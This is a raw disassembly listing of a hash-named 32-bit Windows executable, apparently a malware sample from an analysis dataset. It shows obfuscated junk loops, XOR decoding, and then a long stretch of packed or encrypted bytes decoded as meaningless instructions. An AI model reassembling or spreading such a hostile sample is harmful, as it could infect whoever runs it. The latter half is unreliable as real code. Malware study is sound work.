
1fcf5560ae6e3b35fdf2c410ddcbca6da9930f635efb2522829595a4b05cdd65.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	adc    al,0x37
  401006:	cmp    DWORD PTR [ebp+0x0],ecx
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],dh
  40100d:	adc    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ecx],al
  401011:	add    BYTE PTR [eax],al
  401013:	add    BYTE PTR [ecx],al
  401015:	add    BYTE PTR [eax],al
  401017:	add    BYTE PTR [ecx],al
  401019:	add    BYTE PTR [eax],al
  40101b:	add    BYTE PTR [eax],ch
  40101d:	adc    BYTE PTR [eax],al
  40101f:	add    BYTE PTR [eax+edx*1],ch
  401022:	add    BYTE PTR [eax],al
  401024:	xor    BYTE PTR [eax],dl
  401026:	add    BYTE PTR [eax],al
  401028:	xor    BYTE PTR [eax+eax*1+0x103e00],al
  40102f:	add    BYTE PTR [eax],al
  401031:	add    BYTE PTR [edi+0x6f],dl
  401034:	jb     0x40109a
  401036:	push   edi
  401037:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  40103e:	aas    
  40103f:	inc    ebx
  401040:	ins    BYTE PTR es:[edi],dx
  401041:	outs   dx,DWORD PTR ds:[esi]
  401042:	jae    0x4010a9
  401044:	push   edi
  401045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  40104c:	popa   
  40104d:	je     0x4010b8
  40104f:	outs   dx,DWORD PTR ds:[esi]
  401050:	outs   dx,BYTE PTR ds:[esi]
  401051:	inc    ebx
  401052:	ins    BYTE PTR es:[edi],dx
  401053:	outs   dx,DWORD PTR ds:[esi]
  401054:	jae    0x4010bb
  401056:	push   edi
  401057:	imul   edx,DWORD PTR [ebp-0x75],0xa4ec81ec
  40105e:	add    BYTE PTR [eax],al
  401060:	add    BYTE PTR [ebx+0x3d11084d],cl
  401066:	add    BYTE PTR [eax-0x7a47ffbe],ah
  40106c:	mov    al,BYTE PTR [eax]
  40106e:	add    BYTE PTR [esi+0x33],ah
  401071:	inc    ecx
  401072:	and    BYTE PTR [ebx],ch
  401074:	or     eax,0x42b00c
  401079:	mov    ecx,0x3b4b
  40107e:	xor    DWORD PTR ds:0x429018,0x42b01c
  401088:	add    ax,cx
  40108b:	adc    ecx,DWORD PTR ds:0x42c010
  401091:	movzx  eax,ax
  401094:	mov    ecx,DWORD PTR ds:0x423d9a
  40109a:	mov    ecx,DWORD PTR [ecx]
  40109c:	sub    DWORD PTR ds:0x42d014,ecx
  4010a2:	mov    DWORD PTR [ebp-0x18],eax
  4010a5:	and    DWORD PTR ds:0x42c008,ebx
  4010ab:	mov    BYTE PTR [ebp-0x1],0x61
  4010af:	sbb    ecx,0x3fcf
  4010b5:	lea    eax,[ebp-0x1]
  4010b8:	xor    ecx,ecx
  4010ba:	xor    ecx,DWORD PTR ds:0x429024
  4010c0:	adc    ecx,DWORD PTR ds:0x42b004
  4010c6:	mov    DWORD PTR ds:0x429024,ecx
  4010cc:	mov    DWORD PTR [ebp-0x10],eax
  4010cf:	mov    ecx,DWORD PTR ds:0x42d01c
  4010d5:	sub    DWORD PTR ds:0x42900c,ecx
  4010db:	mov    al,BYTE PTR [ebp-0x1]
  4010de:	mov    ecx,DWORD PTR [ebp-0x10]
  4010e1:	xor    DWORD PTR ds:0x42b004,0x42900c
  4010eb:	xor    al,0x6f
  4010ed:	sub    al,0xd
  4010ef:	adc    DWORD PTR ds:0x42d008,0x362f
  4010f9:	mov    BYTE PTR [ecx],al
  4010fb:	mov    DWORD PTR ds:0x429020,0x1b
  401105:	cmp    DWORD PTR ds:0x429020,0x0
  40110c:	je     0x40113f
  401112:	cmp    DWORD PTR ds:0x429020,0x24
  401119:	jne    0x40112d
  40111f:	push   DWORD PTR [ebp-0x24]
  401122:	push   0x424486
  401127:	call   DWORD PTR ds:0x425010
  40112d:	mov    ecx,DWORD PTR ds:0x429020
  401133:	dec    ecx
  401134:	mov    DWORD PTR ds:0x429020,ecx
  40113a:	jmp    0x401105
  40113f:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  401146:	push   ebx
  401147:	sub    ecx,eax
  401149:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  401150:	and    DWORD PTR ds:0x42901c,ebx
  401156:	mov    ecx,DWORD PTR [ebp-0x14]
  401159:	push   esi
  40115a:	mov    eax,0x7510893
  40115f:	xor    ecx,eax
  401161:	or     esi,DWORD PTR ds:0x42900c
  401167:	mov    esi,0x3272db
  40116c:	and    DWORD PTR ds:0x429024,0x1a45
  401176:	push   edi
  401177:	sub    DWORD PTR ds:0x42c018,0x2ac6
  401181:	add    ecx,esi
  401183:	mov    DWORD PTR ds:0x42c008,0x57e6
  40118d:	jmp    0x4011bb
  401192:	mov    DWORD PTR ds:0x42a014,0x4932
  40119c:	mov    dl,BYTE PTR [ebp-0x1]
  40119f:	mov    DWORD PTR ds:0x42d014,0x6fce
  4011a9:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  4011b0:	mov    DWORD PTR ds:0x42c010,0x5862
  4011ba:	inc    ecx
  4011bb:	mov    DWORD PTR ds:0x42a018,0x6e07
  4011c5:	cmp    ecx,0x40
  4011c8:	jb     0x401192
  4011ce:	sbb    DWORD PTR ds:0x42a010,0x6c84
  4011d8:	mov    edx,DWORD PTR [ebp-0x14]
  4011db:	add    DWORD PTR ds:0x42b004,0x42900c
  4011e5:	xor    edx,eax
  4011e7:	sub    DWORD PTR ds:0x42c018,0x6b15
  4011f1:	add    edx,esi
  4011f3:	jmp    0x40132b
  4011f8:	add    DWORD PTR ds:0x42b000,ecx
  4011fe:	mov    edi,DWORD PTR [ebp+0x8]
  401201:	mov    DWORD PTR ds:0x42b010,0x1a
  40120b:	cmp    DWORD PTR ds:0x42b010,0x0
  401212:	je     0x40126b
  401218:	cmp    DWORD PTR ds:0x42b010,0x3
  40121f:	jne    0x401233
  401225:	push   0x3d21
  40122a:	push   DWORD PTR [ebp-0x10]
  40122d:	call   DWORD PTR ds:0x425018
  401233:	cmp    DWORD PTR ds:0x42b010,0x4
  40123a:	jne    0x40124f
  401240:	xor    ecx,ecx
  401242:	or     ecx,DWORD PTR ds:0x42b010
  401248:	dec    ecx
  401249:	mov    DWORD PTR ds:0x42b010,ecx
  40124f:	mov    ecx,DWORD PTR ds:0x42b010
  401255:	dec    ecx
  401256:	mov    DWORD PTR ds:0x42b010,ecx
  40125c:	jmp    0x40120b
  401261:	or     DWORD PTR ds:0x429004,0x4238
  40126b:	mov    ecx,0x8a85
  401270:	sbb    DWORD PTR ds:0x42a014,0x4641
  40127a:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40127f:	xor    DWORD PTR ds:0x42901c,edi
  401285:	mov    edi,0x3b4b
  40128a:	add    cx,di
  40128d:	and    DWORD PTR ds:0x42a01c,0x60c1
  401297:	movzx  ecx,cx
  40129a:	mov    DWORD PTR [ebp-0x10],ecx
  40129d:	and    DWORD PTR ds:0x42c014,0x0
  4012a7:	jmp    0x4012b9
  4012ac:	mov    ecx,DWORD PTR ds:0x42c014
  4012b2:	inc    ecx
  4012b3:	mov    DWORD PTR ds:0x42c014,ecx
  4012b9:	cmp    DWORD PTR ds:0x42c014,0x14
  4012c0:	jae    0x4012ec
  4012c6:	cmp    DWORD PTR ds:0x42c014,0x19
  4012cd:	jne    0x4012e5
  4012d3:	push   0x42d008
  4012d8:	push   0x0
  4012da:	push   0x4243c9
  4012df:	call   DWORD PTR ds:0x42501c
  4012e5:	jmp    0x4012ac
  4012ea:	neg    ecx
  4012ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4012ef:	mov    DWORD PTR ds:0x42a000,0x57bf
  4012f9:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012fd:	xor    ecx,0x8a85
  401303:	add    DWORD PTR ds:0x42b00c,0x42c004
  40130d:	add    ecx,edi
  40130f:	movzx  edi,BYTE PTR ds:0x42c018
  401316:	mov    edi,DWORD PTR [ebp-0x10]
  401319:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  401320:	mov    DWORD PTR ds:0x429024,0x374e
  40132a:	inc    edx
  40132b:	mov    ecx,0x6cf1
  401330:	mov    ecx,DWORD PTR [ebp-0x18]
  401333:	cmp    edx,ecx
  401335:	jne    0x4011f8
  40133b:	mov    ecx,DWORD PTR [ebp-0x14]
  40133e:	and    DWORD PTR ds:0x42d014,0x0
  401348:	mov    edx,DWORD PTR ds:0x42d014
  40134e:	inc    edx
  40134f:	mov    DWORD PTR ds:0x42d014,edx
  401355:	cmp    DWORD PTR ds:0x42d014,0x1e
  40135c:	jne    0x401370
  401362:	push   0x42a010
  401367:	push   DWORD PTR [ebp-0xc]
  40136a:	call   DWORD PTR ds:0x425020
  401370:	cmp    DWORD PTR ds:0x42d014,0x1a
  401377:	jb     0x401348
  40137d:	mov    edx,DWORD PTR [ebp+0x10]
  401380:	add    DWORD PTR ds:0x429018,0x42d01c
  40138a:	xor    ecx,eax
  40138c:	add    ecx,esi
  40138e:	mov    DWORD PTR [edx],ecx
  401390:	xor    DWORD PTR ds:0x429020,0x151c
  40139a:	mov    ecx,DWORD PTR [ebp-0x14]
  40139d:	sbb    DWORD PTR ds:0x42a004,0x76e2
  4013a7:	xor    ecx,eax
  4013a9:	add    ecx,esi
  4013ab:	mov    DWORD PTR [ebp-0x20],ecx
  4013ae:	mov    DWORD PTR ds:0x42c00c,0x69f9
  4013b8:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  4013bf:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013c6:	mov    DWORD PTR ds:0x42c00c,ecx
  4013cc:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4013d6:	mov    DWORD PTR ds:0x429004,0x7870
  4013e0:	mov    DWORD PTR [ebp+0x8],ecx
  4013e3:	jmp    0x4015f6
  4013e8:	xor    DWORD PTR ds:0x42a014,0x45a5
  4013f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4013f5:	and    DWORD PTR ds:0x42b008,0x0
  4013ff:	mov    edx,DWORD PTR ds:0x42b008
  401405:	inc    edx
  401406:	mov    DWORD PTR ds:0x42b008,edx
  40140c:	cmp    DWORD PTR ds:0x42b008,0x29
  401413:	jne    0x401424
  401419:	push   0x3311
  40141e:	call   DWORD PTR ds:0x425028
  401424:	cmp    DWORD PTR ds:0x42b008,0x1f
  40142b:	jb     0x4013ff
  401431:	adc    DWORD PTR ds:0x42a008,0x7a1a
  40143b:	mov    edx,DWORD PTR [ebp-0x8]
  40143e:	neg    DWORD PTR ds:0x42b00c
  401444:	xor    ecx,eax
  401446:	xor    DWORD PTR ds:0x429018,0x42b01c
  401450:	xor    edx,eax
  401452:	or     DWORD PTR ds:0x429020,0x5996
  40145c:	sub    ecx,edx
  40145e:	movzx  edx,BYTE PTR ds:0x42a014
  401465:	adc    DWORD PTR ds:0x429028,edx
  40146b:	sub    ecx,esi
  40146d:	xor    DWORD PTR ds:0x429028,0xa7c
  401477:	xor    ecx,eax
  401479:	not    edx
  40147b:	mov    DWORD PTR [ebp+0x8],ecx
  40147e:	add    DWORD PTR ds:0x42a01c,0x480
  401488:	mov    ecx,DWORD PTR [ebp+0x8]
  40148b:	mov    edx,DWORD PTR [ebp-0x64]
  40148e:	or     DWORD PTR ds:0x429028,0x2c95
  401498:	lea    ecx,[edx+ecx*1+0x5708f5]
  40149f:	and    edx,0x1ea1
  4014a5:	mov    DWORD PTR [ebp-0x64],ecx
  4014a8:	and    DWORD PTR ds:0x42c000,0x0
  4014b2:	jmp    0x4014c4
  4014b7:	mov    ecx,DWORD PTR ds:0x42c000
  4014bd:	inc    ecx
  4014be:	mov    DWORD PTR ds:0x42c000,ecx
  4014c4:	cmp    DWORD PTR ds:0x42c000,0x1f
  4014cb:	jae    0x401506
  4014d1:	cmp    DWORD PTR ds:0x42c000,0x2a
  4014d8:	jne    0x401501
  4014de:	push   DWORD PTR [ebp-0x1c]
  4014e1:	push   DWORD PTR [ebp-0x10]
  4014e4:	push   0x42a004
  4014e9:	push   0x8921
  4014ee:	push   DWORD PTR [ebp-0x24]
  4014f1:	push   0x8115
  4014f6:	push   0x4d38
  4014fb:	call   DWORD PTR ds:0x42502c
  401501:	jmp    0x4014b7
  401506:	mov    ecx,DWORD PTR [ebp+0x8]
  401509:	mov    edx,DWORD PTR [ebp-0x60]
  40150c:	sub    DWORD PTR ds:0x42a000,0x42a01c
  401516:	lea    ecx,[edx+ecx*1+0x5708f5]
  40151d:	neg    edx
  40151f:	mov    DWORD PTR [ebp-0x60],ecx
  401522:	adc    DWORD PTR ds:0x42d01c,edx
  401528:	mov    ecx,DWORD PTR [ebp+0x8]
  40152b:	add    DWORD PTR ds:0x429008,0x3e29
  401535:	mov    edx,DWORD PTR [ebp-0x5c]
  401538:	add    DWORD PTR ds:0x429028,0x42b010
  401542:	lea    ecx,[edx+ecx*1+0x5708f4]
  401549:	and    DWORD PTR ds:0x42d008,0x0
  401553:	mov    edx,DWORD PTR ds:0x42d008
  401559:	inc    edx
  40155a:	mov    DWORD PTR ds:0x42d008,edx
  401560:	cmp    DWORD PTR ds:0x42d008,0x8
  401567:	jne    0x401576
  40156d:	push   DWORD PTR [ebp-0x20]
  401570:	call   DWORD PTR ds:0x425030
  401576:	cmp    DWORD PTR ds:0x42d008,0x7
  40157d:	jne    0x401592
  401583:	xor    edx,edx
  401585:	or     edx,DWORD PTR ds:0x42d008
  40158b:	inc    edx
  40158c:	mov    DWORD PTR ds:0x42d008,edx
  401592:	cmp    DWORD PTR ds:0x42d008,0x17
  401599:	jb     0x401553
  40159f:	xor    edx,DWORD PTR ds:0x42d00c
  4015a5:	mov    DWORD PTR [ebp-0x5c],ecx
  4015a8:	sbb    ecx,edx
  4015aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4015ad:	xor    DWORD PTR ds:0x42b01c,0x42c004
  4015b7:	mov    edx,DWORD PTR [ebp-0x58]
  4015ba:	lea    ecx,[edx+ecx*1+0x5708fb]
  4015c1:	xor    edx,0x2bb1
  4015c7:	mov    DWORD PTR [ebp-0x58],ecx
  4015ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4015cd:	mov    edx,DWORD PTR [ebp-0x54]
  4015d0:	adc    DWORD PTR ds:0x429024,0x7906
  4015da:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015e1:	not    edx
  4015e3:	mov    DWORD PTR [ebp-0x54],ecx
  4015e6:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e9:	mov    edx,DWORD PTR [ebp-0x50]
  4015ec:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015f3:	mov    DWORD PTR [ebp-0x50],ecx
  4015f6:	dec    ecx
  4015f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4015fa:	xor    ecx,eax
  4015fc:	or     DWORD PTR ds:0x42d000,0x34f3
  401606:	add    ecx,esi
  401608:	mov    DWORD PTR ds:0x42c01c,0x3161
  401612:	jne    0x4013e8
  401618:	mov    DWORD PTR ds:0x429018,0x1b23
  401622:	jmp    0x405fe7
  401627:	mov    ecx,DWORD PTR [ebp-0x1c]
  40162a:	and    DWORD PTR ds:0x42c000,0x0
  401634:	jmp    0x401648
  401639:	xor    edx,edx
  40163b:	xor    edx,DWORD PTR ds:0x42c000
  401641:	inc    edx
  401642:	mov    DWORD PTR ds:0x42c000,edx
  401648:	cmp    DWORD PTR ds:0x42c000,0x15
  40164f:	jae    0x4016e1
  401655:	cmp    DWORD PTR ds:0x42c000,0xa
  40165c:	jne    0x40166e
  401662:	push   DWORD PTR [ebp-0x14]
  401665:	push   DWORD PTR [ebp-0x14]
  401668:	call   DWORD PTR ds:0x425034
  40166e:	cmp    DWORD PTR ds:0x42c000,0x9
  401675:	jne    0x40168a
  40167b:	xor    edx,edx
  40167d:	add    edx,DWORD PTR ds:0x42c000
  401683:	inc    edx
  401684:	mov    DWORD PTR ds:0x42c000,edx
  40168a:	jmp    0x401639
  40168f:	and    DWORD PTR ds:0x42c000,0x0
  401699:	mov    edx,DWORD PTR ds:0x42c000
  40169f:	inc    edx
  4016a0:	mov    DWORD PTR ds:0x42c000,edx
  4016a6:	cmp    DWORD PTR ds:0x42c000,0x1e
  4016ad:	jne    0x4016c6
  4016b3:	push   0x424329
  4016b8:	push   0x424432
  4016bd:	push   DWORD PTR [ebp-0x18]
  4016c0:	call   DWORD PTR ds:0x42503c
  4016c6:	cmp    DWORD PTR ds:0x42c000,0x12
  4016cd:	jb     0x401699
  4016d3:	xor    edx,edx
  4016d5:	xor    edx,DWORD PTR ds:0x429010
  4016db:	sub    DWORD PTR ds:0x42a01c,edx
  4016e1:	mov    edx,DWORD PTR [ebp-0x8]
  4016e4:	xor    ecx,eax
  4016e6:	xor    edx,eax
  4016e8:	add    DWORD PTR ds:0x429014,0x42d010
  4016f2:	sub    ecx,edx
  4016f4:	mov    DWORD PTR ds:0x42d00c,0x49b3
  4016fe:	sub    ecx,esi
  401700:	xor    ecx,eax
  401702:	mov    DWORD PTR ds:0x42901c,0x3f4e
  40170c:	mov    DWORD PTR [ebp-0x1c],ecx
  40170f:	mov    ecx,DWORD PTR ds:0x42b014
  401715:	mov    ecx,DWORD PTR [ebp-0xc]
  401718:	mov    DWORD PTR [ebp+0x8],ecx
  40171b:	jmp    0x40174d
  401720:	mov    ecx,DWORD PTR [ebp+0x8]
  401723:	mov    edx,DWORD PTR [ebp-0x8]
  401726:	xor    ecx,eax
  401728:	xor    edx,eax
  40172a:	sub    ecx,edx
  40172c:	sub    ecx,esi
  40172e:	xor    ecx,eax
  401730:	mov    DWORD PTR [ebp+0x8],ecx
  401733:	mov    ecx,DWORD PTR [ebp+0x8]
  401736:	mov    edx,DWORD PTR [ebp+0x8]
  401739:	imul   edx,edx,0x5708f5
  40173f:	xor    ecx,eax
  401741:	add    ecx,esi
  401743:	lea    ecx,[ebp+ecx*4-0x64]
  401747:	mov    edi,DWORD PTR [ecx]
  401749:	add    edx,edi
  40174b:	mov    DWORD PTR [ecx],edx
  40174d:	mov    ecx,DWORD PTR [ebp+0x8]
  401750:	xor    ecx,eax
  401752:	add    ecx,esi
  401754:	jne    0x401720
  40175a:	mov    ecx,DWORD PTR [ebp-0x20]
  40175d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401764:	mov    dl,BYTE PTR [ebp-0x1]
  401767:	cmp    cl,dl
  401769:	je     0x405f48
  40176f:	mov    ecx,DWORD PTR [ebp-0x20]
  401772:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401779:	mov    edx,DWORD PTR [ebp+0xc]
  40177c:	cmp    cl,BYTE PTR [edx]
  40177e:	jne    0x405ff9
  401784:	mov    ecx,DWORD PTR [ebp-0x14]
  401787:	mov    edx,DWORD PTR [ebp+0xc]
  40178a:	movsx  edx,BYTE PTR [edx]
  40178d:	xor    ecx,eax
  40178f:	add    ecx,esi
  401791:	jmp    0x403b14
  401796:	add    al,0xcb
  401798:	xchg   edi,eax
  401799:	dec    esp
  40179a:	xchg   edi,eax
  40179b:	in     al,0x63
  40179d:	sbb    DWORD PTR [edx],0xffffff98
  4017a0:	adc    al,0xee
  4017a2:	mov    bh,BYTE PTR [esi+0x62623e78]
  4017a8:	bound  esp,QWORD PTR [edx+0x1c]
  4017ab:	pop    edi
  4017ac:	bound  esp,QWORD PTR [edx+0x9]
  4017af:	xor    BYTE PTR [edi],al
  4017b1:	cmp    eax,0xf033905
  4017b6:	jns    0x4017de
  4017b8:	jne    0x401830
  4017ba:	cmp    eax,0x7172727c
  4017bf:	sub    bl,cl
  4017c1:	sar    ch,0x4c
  4017c4:	push   esp
  4017c5:	jae    0x401844
  4017c7:	inc    ebx
  4017c8:	mov    WORD PTR [ecx+esi*2+0x45],?
  4017cc:	scas   eax,DWORD PTR es:[edi]
  4017cd:	inc    ecx
  4017ce:	push   edx
  4017cf:	cmp    al,0x90
  4017d1:	loop   0x40176a
  4017d3:	inc    di
  4017d5:	push   ecx
  4017d6:	jg     0x4017ff
  4017d8:	ins    BYTE PTR es:[edi],dx
  4017d9:	mov    dh,0x7f
  4017db:	mov    esp,0xff3023ba
  4017e0:	jbe    0x4017a2
  4017e2:	loop   0x40182f
  4017e4:	jg     0x401804
  4017e6:	icebp  
  4017e7:	and    eax,0x97f1a2d1
  4017ec:	or     ebx,esi
  4017ee:	xchg   ebx,eax
  4017ef:	xor    eax,0x92b345ef
  4017f4:	fsub   st,st(7)
  4017f6:	jno    0x4017b9
  4017f8:	sbb    al,cl
  4017fa:	out    dx,al
  4017fb:	loop   0x401833
  4017fd:	add    al,0x54
  4017ff:	adc    BYTE PTR [esi],dh
  401801:	jae    0x401877
  401803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401804:	(bad)  
  401805:	or     ebx,DWORD PTR [ebp+0x19]
  401808:	mov    dh,0xff
  40180a:	cmc    
  40180b:	push   ebp
  40180c:	xor    ebp,DWORD PTR [eax+0x2a]
  40180f:	aam    0x43
  401811:	in     eax,0x2
  401813:	loop   0x401879
  401815:	mov    ebp,0x5f84c17b
  40181a:	xchg   ebx,eax
  40181b:	mov    ebp,0x2d9a0817
  401820:	jmp    0x4017c0
  401822:	and    BYTE PTR [edx+0x6b],ch
  401825:	adc    eax,edx
  401827:	xor    DWORD PTR [edx-0x6f],ecx
  40182a:	sub    BYTE PTR [ebx],ch
  40182c:	dec    eax
  40182d:	sti    
  40182e:	scas   eax,DWORD PTR es:[edi]
  40182f:	xchg   edx,eax
  401830:	xor    eax,0xd0a7ac95
  401835:	xchg   esp,eax
  401836:	dec    ebp
  401837:	clc    
  401838:	pop    ecx
  401839:	dec    edx
  40183a:	push   eax
  40183b:	adc    BYTE PTR [esi],bh
  40183d:	jmp    0x401865
  40183f:	sbb    esi,DWORD PTR [ecx+0x2cb7d253]
  401845:	fcomp  QWORD PTR [eax]
  401847:	inc    esi
  401848:	loope  0x401894
  40184a:	inc    esi
  40184b:	mov    ecx,0xe4bf74e5
  401850:	pop    edx
  401851:	sbb    edi,DWORD PTR [edi]
  401853:	pop    es
  401854:	push   esi
  401855:	xchg   edx,eax
  401856:	outs   dx,DWORD PTR ds:[esi]
  401857:	or     al,0x34
  401859:	xor    eax,DWORD PTR [esi]
  40185b:	popa   
  40185c:	das    
  40185d:	hlt    
  40185e:	lods   al,BYTE PTR ds:[esi]
  40185f:	pusha  
  401860:	cmp    eax,0x119226ee
  401865:	and    al,0x52
  401867:	repnz pop es
  401869:	cli    
  40186a:	or     al,0x9a
  40186c:	and    al,0xfd
  40186e:	jne    0x401849
  401870:	dec    ecx
  401871:	repnz xor eax,0xc408e96b
  401877:	jnp    0x4018d7
  401879:	out    dx,eax
  40187a:	xor    bl,BYTE PTR [eax-0x48cbd63e]
  401880:	pop    edx
  401881:	dec    edx
  401882:	aad    0xd3
  401884:	push   0x4782397f
  401889:	(bad)  
  40188a:	jmp    DWORD PTR [eax]
  40188c:	sahf   
  40188d:	aas    
  40188e:	and    BYTE PTR [edx+0x5b2fbf5a],al
  401894:	enter  0xb3ab,0x60
  401898:	xchg   BYTE PTR [ebp+0x17897e62],ch
  40189e:	out    dx,eax
  40189f:	cmp    al,0xca
  4018a1:	inc    ecx
  4018a2:	in     eax,0x5e
  4018a4:	mov    ds:0xdf9dece5,eax
  4018a9:	mov    eax,ds:0x55ee77a6
  4018ae:	(bad)
  4018b2:	and    ecx,DWORD PTR [edi+0x76b2081f]
  4018b8:	mov    esi,0xd750324c
  4018bd:	fwait
  4018be:	adc    BYTE PTR [ebp-0x3742a0f1],0xe3
  4018c5:	cli    
  4018c6:	or     DWORD PTR [edi],edi
  4018c8:	mov    cl,0x4f
  4018ca:	scas   eax,DWORD PTR es:[edi]
  4018cb:	add    bh,BYTE PTR [esi]
  4018cd:	into   
  4018ce:	outs   dx,DWORD PTR ds:[esi]
  4018cf:	aam    0xab
  4018d1:	out    dx,eax
  4018d2:	nop
  4018d3:	xchg   ebx,eax
  4018d4:	jg     0x4018aa
  4018d6:	mov    dh,0x9
  4018d8:	dec    esp
  4018d9:	mov    ah,0xe4
  4018db:	jb     0x40188a
  4018dd:	pop    edx
  4018de:	hlt    
  4018df:	cmc    
  4018e0:	(bad)
  4018e3:	push   ss
  4018e4:	sbb    bh,bh
  4018e6:	push   0xffffffd6
  4018e8:	and    edi,DWORD PTR [esi]
  4018ea:	mov    dh,0xe2
  4018ec:	push   edi
  4018ed:	cmp    DWORD PTR [ecx-0xe],esp
  4018f0:	or     al,0x19
  4018f2:	ret    
  4018f3:	out    dx,eax
  4018f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018f5:	push   ebx
  4018f6:	test   BYTE PTR [esp+ebx*8-0x1c28b975],ah
  4018fd:	shl    DWORD PTR [eax],cl
  4018ff:	daa    
  401900:	sahf   
  401901:	dec    ebx
  401902:	fld    DWORD PTR [ebx]
  401904:	fldz   
  401906:	sbb    DWORD PTR [ebp+0x11],ebp
  401909:	call   0x748d0998
  40190e:	mov    ds:0xfc4a8398,eax
  401913:	add    eax,0x30787426
  401918:	cmp    BYTE PTR [esi],al
  40191a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40191b:	push   ss
  40191c:	mov    bl,0x28
  40191e:	jmp    0x4018bc
  401920:	cmp    al,0xa8
  401922:	std    
  401923:	(bad)  
  401924:	ret    0x4548
  401927:	jae    0x401922
  401929:	or     cl,cl
  40192b:	cwde   
  40192c:	ds xchg esi,eax
  40192e:	cs push ebp
  401930:	fcomp  QWORD PTR [edi-0x3cf1da87]
  401936:	mov    al,ds:0xc1f12ab9
  40193b:	fwait
  40193c:	jp     0x4018bf
  40193e:	jb     0x401905
  401940:	pop    ebx
  401941:	xor    eax,0xd33d698a
  401946:	inc    esi
  401947:	imul   edx,DWORD PTR [ebp+0x32],0xffffff8e
  40194b:	jo     0x40193b
  40194d:	push   ss
  40194e:	fmul   DWORD PTR [eax-0x23e2ae27]
  401954:	pop    esi
  401955:	lds    ebp,FWORD PTR [edi]
  401957:	xchg   DWORD PTR [ecx+esi*2],ecx
  40195a:	nop
  40195b:	leave  
  40195c:	mov    dh,cl
  40195e:	xchg   ebx,eax
  40195f:	mov    ebp,0xff2de68c
  401964:	adc    eax,0x5f355a5d
  401969:	js     0x4019b0
  40196b:	rep outs dx,DWORD PTR ds:[esi]
  40196d:	or     al,0x5
  40196f:	repnz data16 mov gs,WORD PTR [edx-0x52]
  401974:	xor    al,0xeb
  401976:	test   ecx,esi
  401978:	mov    ch,BYTE PTR [esi]
  40197a:	xchg   ebx,eax
  40197b:	pop    ebx
  40197c:	pop    eax
  40197d:	ins    BYTE PTR es:[edi],dx
  40197e:	lahf   
  40197f:	call   0xb1d7:0x9badb42a
  401986:	mov    ds:0xef5786a5,al
  40198b:	scas   eax,DWORD PTR es:[edi]
  40198c:	and    dh,ah
  40198e:	cld    
  40198f:	add    dh,0xf6
  401992:	and    esp,DWORD PTR [ecx-0x36]
  401995:	int3   
  401996:	out    0xa1,eax
  401998:	mov    ds:0x308eaf0c,al
  40199d:	fs push esp
  40199f:	jg     0x4019f0
  4019a1:	sub    eax,0xf893c38f
  4019a6:	adc    eax,0x7fdbf066
  4019ab:	std    
  4019ac:	xchg   ecx,eax
  4019ad:	sub    BYTE PTR [eax+0x17abf3d4],ah
  4019b3:	jp     0x40194d
  4019b5:	jnp    0x4019ff
  4019b7:	popf   
  4019b8:	retf   
  4019b9:	jae    0x40197b
  4019bb:	mov    gs,WORD PTR [ebx]
  4019bd:	pop    ss
  4019be:	jle    0x4019dc
  4019c0:	pop    ss
  4019c1:	cmp    eax,0x892638d
  4019c6:	xor    dh,BYTE PTR [ebx]
  4019c8:	inc    edx
  4019c9:	aam    0x90
  4019cb:	add    eax,0x138f43aa
  4019d0:	les    esi,FWORD PTR [ebp+0x2c517796]
  4019d6:	ss jecxz 0x401a43
  4019d9:	call   DWORD PTR [edx+0x2]
  4019dc:	lea    esi,[ecx]
  4019de:	jmp    0x4019fc
  4019e0:	inc    eax
  4019e1:	xor    al,0xc0
  4019e3:	jl     0x40199d
  4019e5:	jmp    0x4ccd30b6
  4019ea:	add    esi,DWORD PTR [esi-0x67]
  4019ed:	jnp    0x401a4e
  4019ef:	adc    bh,BYTE PTR [esi-0x39]
  4019f2:	jns    0x401992
  4019f4:	not    BYTE PTR [ebx]
  4019f6:	push   ebp
  4019f7:	test   DWORD PTR [ebx+edi*8],esp
  4019fa:	pop    esi
  4019fb:	mov    bh,0x82
  4019fd:	loope  0x401a0f
  4019ff:	les    edi,FWORD PTR [ecx-0x5ba6bf57]
  401a05:	cmp    BYTE PTR [ecx],0xf9
  401a08:	ja     0x4019bd
  401a0a:	arpl   cx,bx
  401a0c:	mov    ebx,0x958fc709
  401a11:	fadd   QWORD PTR [edi+0x53]
  401a14:	inc    ebx
  401a15:	push   edx
  401a16:	mov    ch,dl
  401a18:	adc    eax,ebx
  401a1a:	inc    ebp
  401a1b:	push   0xffffff98
  401a1d:	dec    ecx
  401a1e:	pop    edi
  401a1f:	mov    ds:0x7877339,eax
  401a24:	ins    BYTE PTR es:[edi],dx
  401a25:	jbe    0x4019dd
  401a27:	repnz xchg ebp,eax
  401a29:	xor    eax,0x939393ee
  401a2e:	push   eax
  401a2f:	call   DWORD PTR gs:[ecx-0x54faad8f]
  401a36:	repz pop esi
  401a38:	imul   edi,DWORD PTR [esi-0x7b8fbe2e],0xffffffc5
  401a3f:	jo     0x401a3a
  401a41:	fadd   DWORD PTR [edi+0x5e]
